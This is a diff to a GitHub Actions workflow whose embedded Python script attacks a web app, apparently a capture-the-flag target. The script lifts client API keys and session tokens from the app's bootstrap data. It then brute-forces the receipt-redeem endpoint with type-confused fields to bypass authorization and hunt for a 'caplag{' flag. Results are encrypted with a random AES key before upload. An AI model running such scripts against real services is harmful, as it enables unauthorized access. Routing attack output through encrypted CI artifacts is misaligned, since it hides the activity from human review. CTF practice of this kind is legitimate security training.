@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Redeem receipt then invoke deploy inspector with valid preview header
+      - name: Test build/deploy reference type confusion and encrypt responses
         shell: bash
         run: |
           set -euo pipefail
@@ -33,13 +33,22 @@ jobs:
           import requests, pathlib, urllib.parse, json
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
-          mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json()
-          refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
           auth={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
-          redeem=s.post(urllib.parse.urljoin(base,mf['receiptRedeemEndpoint']),headers=auth,json={'receipt':mf['previewReceipt'],'project':boot['project']},timeout=15,allow_redirects=False)
-          invoke=s.post(urllib.parse.urljoin(base,act['endpoint']),headers={**auth,'X-Launchlet-Preview':boot['project']},json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=15,allow_redirects=False)
-          (out/'summary.json').write_text(json.dumps({'redeem':{'status':redeem.status_code,'body':redeem.text,'headers':dict(redeem.headers),'cookies':s.cookies.get_dict()},'invoke':{'status':invoke.status_code,'body':invoke.text,'headers':dict(invoke.headers),'cookies':s.cookies.get_dict()}},indent=2))
+          inv=s.post(urllib.parse.urljoin(base,act['endpoint']),headers={**auth,'X-Launchlet-Preview':boot['project']},json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=15,allow_redirects=False)
+          deploy_ref=inv.json()['inspector']['deployRef']; url=urllib.parse.urljoin(base,mf['receiptRedeemEndpoint'])
+          values=[mf['previewReceipt'],deploy_ref,act['id'],mf['build'],boot['project'],boot['workspace'],refs['runtime']]
+          projects=[boot['project'],deploy_ref,mf['build'],boot['workspace']]
+          res=[]
+          for receipt in values:
+            for project in projects:
+              for extra in [{},{'deployRef':deploy_ref},{'ref':deploy_ref},{'type':'deploy'},{'kind':'deploy'},{'mode':'deploy'},{'scope':'deploy:inspect'}]:
+                b={'receipt':receipt,'project':project,**extra}
+                r=s.post(url,headers={**auth,'X-Launchlet-Preview':boot['project']},json=b,timeout=10,allow_redirects=False)
+                if r.status_code!=404 or r.text.strip()!='{"error":"receipt_not_found"}':
+                  res.append({'sent':b,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                  if 'caplag{' in r.text and 'preview_manifest_kept_the_receipt' not in r.text: break
+          (out/'summary.json').write_text(json.dumps({'deployRef':deploy_ref,'results':res},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -55,6 +64,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-combined-encrypted
+          name: launchlet-part2-confusion-encrypted
           path: artifact/
           retention-days: 1
